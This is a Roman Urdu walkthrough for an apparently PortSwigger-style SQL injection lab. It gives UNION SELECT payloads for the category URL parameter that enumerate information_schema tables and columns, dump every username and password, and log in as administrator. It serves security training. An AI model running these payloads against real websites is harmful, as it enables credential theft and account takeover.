Is lab mein hamara goal yeh hai ke hum information_schema ka istemal karke pehle users wali secret table aur uske columns ka naam dhoondain, phir administrator ka password nikal kar us se login karein.


### Step-by-Step Solution
**Step 1: Columns Aur Data Type Verify Karna**
 * Browser mein koi bhi category select karo (jaise Gifts).
 * URL bar mein category parameter ke aage yeh payload daal kar test karo:
   ```
   '+UNION+SELECT+'abc','def'%23
   
   ```
   *(Ya phir +--+ use karo agar %23 kaam na kare).*
 * Agar error na aaye, toh confirm ho gaya ke **2 columns** hain aur dono **text** support karte hain.
**Step 2: Database Ki Sabhi Tables Ke Naam Pata Karna**
 * Secret users table dhoondne ke liye yeh payload URL mein bhejain:
   ```
   '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables%23
   
   ```
 * Screen par saari tables ki list nazar aaye gi. Wahan ghor se dekhein, aapko ek random naam wali table mile gi (maslan: **users_abcdef**).
**Step 3: Table Ke Columns Ke Naam Pata Karna**
 * Jab table ka naam (maslan users_abcdef) mil jaye, toh uske andar ke columns dekhne ke liye yeh payload bhejain:
   ```
   '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'%23
   
   ```
 * Screen par aapko do khas columns nazar aayenge (maslan: **username_abcdef** aur **password_abcdef**).
**Step 4: Usernames Aur Passwords Extract Karna**
 * Ab table aur columns dono ke sahi naam mil chuke hain, toh final data nikalne ke liye yeh payload chalaen:
   ```
   '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef%23
   
   ```
 * Page par tamam users ke credentials (usernames aur unke passwords) display ho jayenge. Wahan se **administrator** ka password copy kar lein.
**Step 5: Login & Solve Lab**
 * Website ke **My account** / Login page par jaen.
 * Username: administrator
 * Password: *(Jo password Step 4 mein mila)*
 * Login karte hi lab **Solved** ho jaye gi!
